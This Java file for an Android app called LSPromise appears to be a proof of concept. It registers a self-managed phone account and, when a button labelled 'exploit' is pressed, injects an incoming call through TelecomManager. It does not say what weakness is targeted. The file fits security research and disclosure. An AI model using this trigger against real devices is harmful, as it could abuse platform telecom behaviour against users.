package org.lsposed.lspromise;

import android.app.Activity;
import android.content.ComponentName;
import android.net.Uri;
import android.os.Bundle;
import android.telecom.PhoneAccount;
import android.telecom.PhoneAccountHandle;
import android.telecom.TelecomManager;
import android.view.View;
import android.view.WindowInsets;

/**
 * @author canyie
 */
public class MainActivity extends Activity implements View.OnClickListener {
    private PhoneAccountHandle phoneAccountHandle;
    private TelecomManager telecomManager;

    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        var rootView = findViewById(android.R.id.content);
        rootView.setOnApplyWindowInsetsListener((v, insets) -> {
            var systemBars = insets.getInsets(WindowInsets.Type.systemBars());
            v.setPadding(0, systemBars.top, 0, 0);
            return insets;
        });
        telecomManager = getSystemService(TelecomManager.class);
        phoneAccountHandle = new PhoneAccountHandle(new ComponentName(this, MyConnectionService.class), "LSPromise");
        PhoneAccount phoneAccount = new PhoneAccount.Builder(phoneAccountHandle, "LSPromise account")
                .setCapabilities(PhoneAccount.CAPABILITY_SELF_MANAGED)
                .build();
        telecomManager.registerPhoneAccount(phoneAccount);
        findViewById(R.id.exploit).setOnClickListener(this);
    }


    @Override public void onClick(View v) {
        telecomManager.addNewIncomingCall(phoneAccountHandle, null);
    }
}
